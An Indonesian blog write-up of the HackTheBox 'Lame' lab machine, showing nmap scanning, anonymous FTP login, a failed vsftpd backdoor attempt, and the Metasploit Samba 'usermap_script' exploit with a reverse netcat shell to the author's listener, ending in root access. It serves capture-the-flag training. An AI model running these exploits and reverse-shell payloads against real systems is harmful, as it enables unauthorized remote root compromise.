---
author_web: https://blog.hackstreet.id
title: HackTheBox - Lame
date: 2022-12-24T17:00:00.000+07:00
author: justakazh
tags:
- '445'
- samba
- hacking
- linux
- easy
- hackhebox
- writeup
categories: Capture The Flag
featured_image: "/uploads/justakazh/1-wkevarx8vamjiop87jbj3a.png"
author_description: Aku nulis karena aku pelupa
author_avatar: "/uploads/justakazh/1656477958868.jpeg"
author_facebook: https://facebook.com/
author_twitter: https://twitter.com/akazh18
author_instagram: https://instagram.com/
author_donation: https://paypal.me/jawagalawbgt

---
## Summary

Machine Name : Lame

Machine Difficult : Easy

Machine Author : [ch4p](https://app.hackthebox.com/users/1)

Machine URL : [Hack The Box](https://app.hackthebox.com/machines/Lame) 

## NMAP ENUMERATION

```bash
┌──(punktester㉿kali)-[~/…/ctf/htb/easy/lame]
└─$ sudo nmap -sV 10.10.10.3                                   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-13 12:35 HST
Nmap scan report for lame.htb (10.10.10.3)
Host is up (0.38s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.63 seconds
zsh: segmentation fault  sudo nmap -sV 10.10.10.3
```

### 21 - FTP

Target tersebut memiliki port 21 yang dimana port tersebut merupakan port dari Service FTP, target tersebut menggunakan FTP vsftpd 2.3.4. disini saya tertarik untuk mencoba melakukan anonymous login pada FTP tersebut 

```bash
┌──(punktester㉿kali)-[~]
└─$ ftp lame.htb 21
Connected to lame.htb.
220 (vsFTPd 2.3.4)
Name (lame.htb:punktester): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Service tersebut mengizinkan seseorang untuk login menggunakan akun anonymous, sayangnya saya tidak bisa mencari informasi lebih jauh lagi dikarenakan konfigurasi dari ftp tersebut. selanjutnya saya mencoba mencari exploit untuk vsftpd 2.3.4 pada metasploit

```bash
msf6 exploit(multi/samba/usermap_script) > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 exploit(multi/samba/usermap_script) > 
```

saya menemukan exploit/unix/ftp/vsftpd_234_backdoor yang dimana modul ini adalah untuk memicu vsf_sysutil_extra(); berfungsi dengan mengirimkan urutan byte tertentu 
pada port 21, ketika eksekusi berhasil maka akan menghasilkan pembukaan backdoor pada sistem

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  lame.htb         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/U
                                      sing-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```

sayangnya disini saya tidak berhasil melakukan exploitasi tersebut :')

### 22 - SSH

target tersebut menggunakan SSH dengan versi OpenSSH 4.7p1. ini merupakan versi yang sudah usang, disini saya mencoba untuk mencari exploit untuk versi tersebut dengan searchsploit

```bash
┌──(punktester㉿kali)-[~]
└─$ searchsploit OpenSSH 4.7
------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                           | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                     | linux/remote/45210.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation               | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                           | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                               | linux/remote/45939.py
------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

tidak ada exploit menarik yang berimpact critical untuk versi tersebut, disini saya akan melewati celah tersebut dan saya akan menggunakan exploit tersebut ketika saya membutuhkannya.

### 139,445 - SAMBA

target tersebut memiliki port 139 dan 445 untuk service Samba dengan versi smbd 3.X - 4.X. selanjutnya saya mencoba untuk mencari exploit untuk versi tersebut pada metasploit

```bash
msf6 exploit(multi/samba/usermap_script) > search type:exploit samba

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
   0   exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
   1   exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
   2   exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution
   3   exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   4   exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   5   exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
   6   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba "username map script" Command Execution
   7   exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   8   exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   9   exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   10  exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   11  exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   12  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   13  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   14  exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   15  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   16  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   17  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   18  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow


Interact with a module by name or index. For example info 18, use 18 or use exploit/windows/http/sambar6_search_results
```

terdapat 18 modul yang saya temukan untuk exploit samba tersebut, setelah saya telusuri lebih lanjut target tersebut berpotensi rentan terhadap **Samba "username map script" Command Execution** yaitu pada module nomor 6 **exploit/multi/samba/usermap_script** yang dimana Modul ini mengeksploitasi kerentanan eksekusi perintah di Samba versi 3.0.20 hingga 3.0.25rc3 karena saat menggunakan non-default opsi konfigurasi "username map script". Dengan menentukan nama pengguna mengandung karakter meta shell, sehingga penyerang dapat melakukan RCE pada sistem tersebut.  

```bash
msf6 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  lame.htb         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Command shell session 2 opened (10.10.16.4:4444 -> 10.10.10.3:36449 ) at 2022-10-13 13:11:09 -1000

whoami
root
id
uid=0(root) gid=0(root)
pwd
/
```

GOTCHA! saya berhasil mendapatkan akses tersebut. disini menunjukan bahwa saya mendapatkan akses root pada server tersebut, atau dapat disimpulkan saya tidak perlu melakukan privilege escalation untuk mendapatkan akses root :D